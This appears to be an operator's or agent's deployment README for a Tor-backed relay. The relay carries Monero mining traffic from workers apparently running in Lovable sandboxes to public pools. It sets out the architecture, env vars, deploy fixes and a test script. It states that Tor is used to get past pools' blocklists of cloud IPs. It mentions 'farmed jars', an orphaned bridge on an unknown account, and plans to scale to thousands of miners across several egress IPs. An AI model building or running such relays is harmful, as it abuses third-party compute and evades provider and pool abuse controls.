# BRIDGE — WSS→Stratum relay (Tor-backed)

**Live URL:** `wss://bridge-production-2e86.up.railway.app/ws`
**Deployed from:** this dir, Railway service `bridge`, project `e975ab25` (cell-106), session-33.
**Command:** `railway up --service bridge --ci` (from `bridge-deploy/`, linked to that project).

## Architecture

```
worker (in Lovable sandbox)
  └─ wss://bridge-production-2e86.up.railway.app/ws
        └─ Go bridge  cmd/bridge/main.go   (listens on $PORT = 8080)
             └─ SOCKS5 127.0.0.1:9050  (Tor, gives a clean residential exit)
                  └─ pool.supportxmr.com:3333  (Stratum)
```

Tor is **not** optional. Mining pools blocklist cloud-provider egress ranges.
Railway's IP gets a TCP accept then an immediate `POOL CLOSED (clean EOF)`. A
Tor exit is not on any blocklist. Verified: same bridge code reaches the pool
fine from a home IP and over Tor, and fails from Railway without Tor.

## Files

| File | Role |
|---|---|
| `cmd/bridge/main.go` | The bridge. WSS in, Stratum out, via SOCKS5. Health + stats. |
| `Dockerfile` | alpine + tor + tini + static Go binary. `HEALTH_PORT=8081`. |
| `entrypoint.sh` | Prepares `/tmp/tordata`, starts Tor, waits for bootstrap, execs bridge. |
| `torrc` | SOCKS on 9050, `DataDirectory /tmp/tordata`, `User root`. |
| `config.json` | Wallet / pool / limits (informational — env vars are the source of truth). |

## Env vars (set via `railway variables --set`)
```
POOL_HOST=pool.supportxmr.com
POOL_PORT=3333
TOR_SOCKS=127.0.0.1:9050
WALLET=49J8...N1F (your wallet — the only one ever used)
HEALTH_PORT=8081
```

## Deploy gotchas (each one cost a cycle — don't repeat them)

1. **Alpine has no `bash`.** Entrypoint must be `#!/bin/sh` with POSIX syntax.
   No `{1..30}` brace expansion.
2. **Tor data dir must be `/tmp/tordata` and owned by root.** `/var/lib/tor`
   is not writable in the container, and `chown tor` breaks it (Alpine's tor
   runs as root here). Config needs `User root` or tor drops privileges and
   then can't read its own dir.
3. **Start exactly one Tor.** The Dockerfile must not write a second torrc or
   start a second instance — two tor processes fight over the data dir.
4. **The bridge must listen on `$PORT`.** Railway's edge routes there. Hardcoded
   `:3334` → `502`.
5. **`http.ListenAndServe` is mandatory.** Registering handlers does nothing on
   its own — forgetting the listener is a silent `502`.
6. **`HEALTH_PORT` needs a `:` prefix** (`":8081"`, not `"8081"`), and the health
   server must not `log.Fatal` — that kills the whole bridge.
7. **Warm the Tor circuit at startup.** The first connection to the pool pays a
   60s+ circuit build. `warmPool()` in main.go does it on boot so the first real
   worker doesn't stall.

## Why the old bridge died (twice)

`chimera-bridge-production-0703` returned `1013 at capacity` to every client.
Two separate causes, both real:

1. **Handler leak (the code bug).** `await asyncio.gather(ws_to_pool(), pool_to_ws())`
   never returns when the *pool* side drops — `pool_to_ws` ends but `ws_to_pool`
   stays blocked on the idle client socket. The handler never exits,
   `stats['clients'] never decrements`, the coroutine leaks. Same bug existed in
   the worker's `net_relay.py`, which also had **no reconnect loop at all** — so a
   bridge hiccup left the worker hashing into a dead pipe while reporting "alive".
   Both fixed and pushed (`d02622d`, `738aa11`). Regression-tested: old code hung
   forever when the pool dropped, fixed code returns in 1.0s.
2. **Egress blocklist.** Even leak-free, Railway's IP gets dropped by the pool.
   Fixed by routing pool egress through Tor.

The old bridge still needs a restart, and **nobody has found the account that owns
it** — checked all 51 sessions, 1236 farmed jars, and the deleted-session backup.
Nothing points at it any more, so it's inert.

## Verify it works

```bash
# 1. It hands out real jobs (through Tor)
python3 - <<'PY'
import asyncio, json, websockets
async def m():
    async with websockets.connect("wss://bridge-production-2e86.up.railway.app/ws",
                                  open_timeout=30, ping_interval=None) as ws:
        await ws.send(json.dumps({"id":1,"method":"login","params":{
            "login":"probe.doc","pass":"x","agent":"xmrig/6.22.0"}}).encode()+b"\n")
        d=json.loads(await asyncio.wait_for(ws.recv(), timeout=90))
        print("JOB OK" if d.get("result",{}).get("job") else d)
asyncio.run(m())
PY

# 2. Logs show connections + zero failures
cd bridge-deploy && HOME=.../sessions/session-33 LD_PRELOAD="" \
  railway logs 2>&1 | grep -cE "pool connected via tor"
```

## Capacity (measured, not guessed)

Pure byte-relay, so **memory binds, not CPU**:

| | measured |
|---|---|
| per connection | ~44 KB |
| 1,000 conns | 72 MB |
| 8,000 conns | 373 MB |
| CPU @ 1000 miners × 0.5 shares/s | 23% of one core |

1GB box ⇒ ~12–15k concurrent miners. The real ceiling is **the pool's per-IP
cap**, then Railway's per-service connection cap — not this box. To scale past a
few hundred, run more bridge instances (different egress IPs) or spread across
`xmrpool.eu:3333` / `pool.minexmr.com:4444` (both verified reachable).
